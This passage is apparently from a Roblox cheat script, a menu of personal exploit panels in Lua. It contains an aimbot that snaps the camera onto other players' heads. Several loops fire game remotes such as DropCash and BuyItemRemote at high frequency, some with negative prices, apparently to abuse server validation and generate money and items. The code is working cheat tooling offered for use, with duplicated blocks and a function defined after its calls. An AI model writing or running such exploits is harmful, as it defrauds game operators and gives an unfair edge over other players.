userBox.TextColor3 = Color3.new(0,0,0)
userBox.Font = Enum.Font.GothamSemibold
userBox.TextSize = 16
userBox.TextXAlignment = Enum.TextXAlignment.Left
userBox.TextEditable = false
userBox.ClearTextOnFocus = false
userBox.Parent = frame
Instance.new("UICorner", userBox).CornerRadius = UDim.new(0,10)
local pad1 = Instance.new("UIPadding", userBox)
pad1.PaddingLeft = UDim.new(0,14)

-- Amount Box (White bg na rin!)
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1,-40,0,40)
amountBox.Position = UDim2.new(0,20,0,105)
amountBox.BackgroundColor3 = Color3.new(1,1,1)   -- white bg
amountBox.PlaceholderText = "Enter amount (ex: 0.1)"
amountBox.Text = "0.1"
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 16
amountBox.TextXAlignment = Enum.TextXAlignment.Left
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0,10)
local pad2 = Instance.new("UIPadding", amountBox)
pad2.PaddingLeft = UDim.new(0,14)
pad2.Parent = amountBox

-- START & STOP Buttons
local startBtn = Instance.new("TextButton")
startBtn.Size = UDim2.new(0.48,0,0,44)
startBtn.Position = UDim2.new(0,20,1,-20)
startBtn.AnchorPoint = Vector2.new(0,1)
startBtn.BackgroundColor3 = Color3.new(1,1,1)
startBtn.Text = "START"
startBtn.TextColor3 = Color3.new(0,0,0)
startBtn.Font = Enum.Font.GothamBold
startBtn.TextSize = 19
startBtn.Parent = frame
Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0,12)

local stopBtn = Instance.new("TextButton")
stopBtn.Size = UDim2.new(0.48,0,0,44)
stopBtn.Position = UDim2.new(0.52,0,1,-20)
stopBtn.AnchorPoint = Vector2.new(0,1)
stopBtn.BackgroundColor3 = Color3.new(1,1,1)
stopBtn.Text = "STOP"
stopBtn.TextColor3 = Color3.new(0,0,0)
stopBtn.Font = Enum.Font.GothamBold
stopBtn.TextSize = 19
stopBtn.Parent = frame
Instance.new("UICorner", stopBtn).CornerRadius = UDim.new(0,12)

-- Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,0,0,25)
status.Position = UDim2.new(0,0,1,-28)
status.BackgroundTransparency = 1
status.Text = "Status: Idle"
status.TextColor3 = Color3.fromRGB(80,80,80)
status.Font = Enum.Font.GothamSemibold
status.TextSize = 14
status.Parent = frame

-- Logic (same pero mas malinis)
local running = false

startBtn.MouseButton1Click:Connect(function()
    if running then return end
    running = true
    status.Text = "Status: Dropping cash..."
    status.TextColor3 = Color3.fromRGB(0,120,0)

    task.spawn(function()
        while running do
            local amt = tonumber(amountBox.Text) or 0.1
            ReplicatedStorage.DropCash:FireServer(player.Name, amt)
            task.wait(0.05)
        end
    end)
end)

stopBtn.MouseButton1Click:Connect(function()
    running = false
    status.Text = "Status: Idle"
    status.TextColor3 = Color3.fromRGB(80,80,80)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL SCRIPT FOR (CHESTER)", function()
	--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// AIMBOT SETTINGS
local AimEnabled = false
local AimbotMode = "Instant"
local Smoothness = 1
local BaseFOV = 5

--// CROSSHAIR DATA
local Crosshairs = {
    {id = 1827745860, name = "Dot", fovMult = 0.5},
    {id = 5998624788, name = "Circle", fovMult = 1.2},
    {id = 749187669, name = "Cross", fovMult = 1.0},
    {id = 1469004289, name = "Small X", fovMult = 0.7},
    {id = 11722368344, name = "Big Circle", fovMult = 2.0},
    {id = 2614612882, name = "Thin Cross", fovMult = 0.8},
    {id = 749187664, name = "Plus", fovMult = 0.9},
    {id = 251435889, name = "Classic", fovMult = 1.1},
    {id = 5143056985, name = "Red Dot", fovMult = 0.6},
    {id = 11759202791, name = "Holo", fovMult = 1.5},
    {id = 1478500977, name = "Star", fovMult = 1.3},
    {id = 11726821301, name = "Neon", fovMult = 1.1},
    {id = 5536063313, name = "Target", fovMult = 1.4},
    {id = 11746928636, name = "Scope", fovMult = 1.8},
    {id = 11759198682, name = "Ring", fovMult = 1.6},
    {id = 11826465934, name = "Hex", fovMult = 1.0},
    {id = 11927593271, name = "Glow", fovMult = 1.7},
    {id = 11867351018, name = "Tech", fovMult = 1.2},
    {id = 4048495272,   name = "Pulse", fovMult = 0.9},
    {id = 10891594364,  name = "Vortex", fovMult = 1.4},
    {id = 5998624778,   name = "Mini Dot", fovMult = 0.6},
    {id = 2207556774,   name = "Arrow", fovMult = 1.1},
    {id = 426730675,    name = "Bracket", fovMult = 1.0},
    {id = 11754490336,  name = "Hollow", fovMult = 1.3},
    {id = 10868459554,  name = "Trident", fovMult = 1.2},
    {id = 11719595129,  name = "Blade", fovMult = 0.8},
    {id = 1489774665,   name = "Nexus", fovMult = 1.5},
    {id = 6079707648,   name = "Core", fovMult = 0.7},
    {id = 11390723044,  name = "Phantom", fovMult = 1.6},
    {id = 10878218322,  name = "Ghost", fovMult = 1.1},
    {id = 11722081515,  name = "Razor", fovMult = 0.9},
    {id = 11390723057,  name = "Spike", fovMult = 1.0},
    {id = 251497633,    name = "Retro", fovMult = 1.2},
    {id = 11722153703,  name = "Fusion", fovMult = 1.7},
    {id = 8680062686,   name = "Nova", fovMult = 1.4},
    {id = 11350518862,  name = "Apex", fovMult = 1.3},
    {id = 11722554017,  name = "Zenith", fovMult = 1.8},
    {id = 8360620314,   name = "Echo", fovMult = 1.0},
    {id = 11988231127,  name = "Spectre", fovMult = 1.5},
    {id = 11830989304,  name = "Cipher", fovMult = 1.2},
    {id = 11759293285,  name = "Omega", fovMult = 1.6},
    {id = 11754499452,  name = "Sigma", fovMult = 0.8},
    {id = 2555584348,   name = "Delta", fovMult = 1.1},
    {id = 11717828297,  name = "Gamma", fovMult = 1.3},
    {id = 11724945237,  name = "Theta", fovMult = 1.4},
    {id = 11733801922,  name = "Kappa", fovMult = 1.0},
    {id = 11733622734,  name = "Lambda", fovMult = 1.2},
    {id = 11754273720,  name = "Mu", fovMult = 0.9},
    {id = 11754490994,  name = "Nu", fovMult = 1.1},
    {id = 11756696859,  name = "Xi", fovMult = 1.5},
    {id = 11802094220,  name = "Omicron", fovMult = 1.3},
    {id = 11867337948,  name = "Pi", fovMult = 1.0},
    {id = 11915656516,  name = "Rho", fovMult = 1.4},
    {id = 11986603133,  name = "Tau", fovMult = 1.7}
}

local CurrentCrosshair = Crosshairs[1]
local CurrentFOV = BaseFOV * CurrentCrosshair.fovMult

--// GUI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CrosshairAimbotGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

--// CROSSHAIR
local crosshair = Instance.new("ImageLabel")
crosshair.Name = "CenterCrosshair"
crosshair.Image = "rbxassetid://" .. tostring(CurrentCrosshair.id)
crosshair.Size = UDim2.new(0, 32, 0, 32)
crosshair.AnchorPoint = Vector2.new(0.5, 0.5)
crosshair.Position = UDim2.new(0.5, 0, 0.46, 0)
crosshair.BackgroundTransparency = 1
crosshair.ZIndex = 10
crosshair.Active = false
crosshair.Parent = screenGui

--// HIDE CROSSHAIR (I)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.I then
		crosshair.Visible = not crosshair.Visible
	end
end)

--// MAIN FRAME
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 340, 0, 560)
mainFrame.Position = UDim2.new(0, 20, 0.5, -280)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

--// TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "CROSSHAIR AIMBOT - GOMA"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = title

--// SCROLL FRAME
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -160)
scrollFrame.Position = UDim2.new(0, 10, 0, 55)
scrollFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollFrame.ScrollBarThickness = 6
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = mainFrame

local layout = Instance.new("UIGridLayout")
layout.CellSize = UDim2.new(0, 85, 0, 95)
layout.CellPadding = UDim2.new(0, 12, 0, 12)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrollFrame

--// SETTINGS FRAME
local settingsFrame = Instance.new("Frame")
settingsFrame.Size = UDim2.new(1, -20, 0, 110)
settingsFrame.Position = UDim2.new(0, 10, 1, -120)
settingsFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
settingsFrame.BorderSizePixel = 0
settingsFrame.Parent = mainFrame

local settingsCorner = Instance.new("UICorner")
settingsCorner.CornerRadius = UDim.new(0, 10)
settingsCorner.Parent = settingsFrame

-- Mode Label
local modeLabel = Instance.new("TextLabel")
modeLabel.Text = "Aimbot Mode:"
modeLabel.TextColor3 = Color3.fromRGB(0,0,0)
modeLabel.Size = UDim2.new(0, 120, 0, 25)
modeLabel.Position = UDim2.new(0, 10, 0, 10)
modeLabel.BackgroundTransparency = 1
modeLabel.Font = Enum.Font.Gotham
modeLabel.TextSize = 14
modeLabel.Parent = settingsFrame

-- Mode Dropdown Button
local modeDropdown = Instance.new("TextButton")
modeDropdown.Text = "Mode: Instant"
modeDropdown.Size = UDim2.new(0, 160, 0, 25)
modeDropdown.Position = UDim2.new(0, 140, 0, 10)
modeDropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
modeDropdown.TextColor3 = Color3.fromRGB(0,0,0)
modeDropdown.Font = Enum.Font.Gotham
modeDropdown.TextSize = 14
modeDropdown.Parent = settingsFrame

local dropdownCorner = Instance.new("UICorner")
dropdownCorner.CornerRadius = UDim.new(0, 8)
dropdownCorner.Parent = modeDropdown

-- Toggle Mode Function
modeDropdown.MouseButton1Click:Connect(function()
	if AimbotMode == "Instant" then
		AimbotMode = "Smooth"
		modeDropdown.Text = "Mode: Smooth"
	else
		AimbotMode = "Instant"
		modeDropdown.Text = "Mode: Instant"
	end
end)

-- Smoothness Input
local smoothLabel = Instance.new("TextLabel")
smoothLabel.Text = "Smoothness:"
smoothLabel.TextColor3 = Color3.fromRGB(0,0,0)
smoothLabel.Size = UDim2.new(0, 120, 0, 25)
smoothLabel.Position = UDim2.new(0, 10, 0, 45)
smoothLabel.BackgroundTransparency = 1
smoothLabel.Font = Enum.Font.Gotham
smoothLabel.TextSize = 14
smoothLabel.Parent = settingsFrame

local smoothBox = Instance.new("TextBox")
smoothBox.Size = UDim2.new(0, 160, 0, 25)
smoothBox.Position = UDim2.new(0, 140, 0, 45)
smoothBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
smoothBox.TextColor3 = Color3.fromRGB(0,0,0)
smoothBox.PlaceholderText = tostring(Smoothness)
smoothBox.Font = Enum.Font.Code
smoothBox.TextSize = 14
smoothBox.Parent = settingsFrame

local smoothCorner = Instance.new("UICorner")
smoothCorner.CornerRadius = UDim.new(0, 8)
smoothCorner.Parent = smoothBox

-- Update Smoothness on Input
smoothBox.FocusLost:Connect(function(enterPressed)
	local val = tonumber(smoothBox.Text)
	if val and val > 0 then
		Smoothness = math.clamp(val, 0.01, 1)
	end
end)

-- STATUS LABEL
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 35)
statusLabel.Position = UDim2.new(0, 10, 1, -45)
statusLabel.BackgroundColor3 = Color3.fromRGB(255,255,255)
statusLabel.TextColor3 = Color3.fromRGB(0,0,0)
statusLabel.Text = "Aimbot: OFF | FOV: " .. CurrentFOV
statusLabel.Font = Enum.Font.Code
statusLabel.TextSize = 16
statusLabel.Parent = mainFrame

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 8)
statusCorner.Parent = statusLabel

-- CROSSHAIR BUTTONS
local function createCrosshairButton(data)
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
    frame.BorderSizePixel = 1
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(1, -8, 0.75, -8)
    img.Position = UDim2.new(0, 4, 0, 4)
    img.BackgroundTransparency = 1
    img.Image = "rbxassetid://" .. tostring(data.id)
    img.ImageColor3 = Color3.fromRGB(255, 255, 255)
    img.Parent = frame

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.25, 0)
    nameLabel.Position = UDim2.new(0, 0, 0.75, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = data.name
    nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
    nameLabel.Font = Enum.Font.Gotham
    nameLabel.TextSize = 13
    nameLabel.Parent = frame

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = ""
    button.Parent = frame

    button.MouseButton1Click:Connect(function()
        CurrentCrosshair = data
        CurrentFOV = BaseFOV * data.fovMult
        crosshair.Image = "rbxassetid://" .. tostring(data.id)
        statusLabel.Text = "Aimbot: " .. (AimEnabled and "ON" or "OFF") .. " | FOV: " .. math.floor(CurrentFOV * 10) / 10
    end)

    frame.Parent = scrollFrame
end

for _, data in ipairs(Crosshairs) do
	createCrosshairButton(data)
end

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
end)

--// AIMBOT LOGIC
local function getTargetPart(character)
	return character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
end

local function getClosestPlayer()
	local closest, shortest = nil, math.huge
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return nil end
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character then
			local part = getTargetPart(p.Character)
			local hum = p.Character:FindFirstChildOfClass("Humanoid")
			if part and hum and hum.Health > 0 then
				local pos, visible = Camera:WorldToScreenPoint(part.Position)
				if visible then
					local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
					if dist < CurrentFOV * 20 and dist < shortest then
						closest, shortest = part.Position, dist
					end
				end
			end
		end
	end
	return closest
end

local function aimAtTarget()
	local t = getClosestPlayer()
	if t then
		if AimbotMode == "Instant" then
			Camera.CFrame = CFrame.new(Camera.CFrame.Position, t)
		else
			Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, t), Smoothness)
		end
	end
end

-- RIGHT-CLICK TOGGLE AIMBOT
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = true
		statusLabel.Text = "Aimbot: ON | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

UserInputService.InputEnded:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = false
		statusLabel.Text = "Aimbot: OFF | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

RunService.RenderStepped:Connect(function()
	if AimEnabled then
		aimAtTarget()
	end
end)

-- TOGGLE MENU (INSERT)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.Insert then
		mainFrame.Visible = not mainFrame.Visible
	end
end)

print("ILOVEYOU MONSY !")
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO CITY (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "Bagong Baryo City"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "Pen Gun", "AK-47", "AmmoBox"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(10)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO SPAWN GUN (SANTINO)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PERSONAL SANTINO SCRIPT"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "Pen Gun", "Unknown", "Unknown"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["THE BILLIONARE"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN GUN (MONSY)", function()
    local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "BillionaireCityGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (White)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 340)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.new(1,1,1)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Text = "THE BILLIONAIRE CITY RP"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBlack
title.TextSize = 22
title.Parent = frame

-- Dropdown Button
local dropdownBtn = Instance.new("TextButton")
dropdownBtn.Size = UDim2.new(1, -40, 0, 50)
dropdownBtn.Position = UDim2.new(0, 20, 0, 70)
dropdownBtn.BackgroundColor3 = Color3.new(1,1,1)
dropdownBtn.Text = "Select Item"
dropdownBtn.TextColor3 = Color3.new(0,0,0)
dropdownBtn.Font = Enum.Font.GothamSemibold
dropdownBtn.TextSize = 18
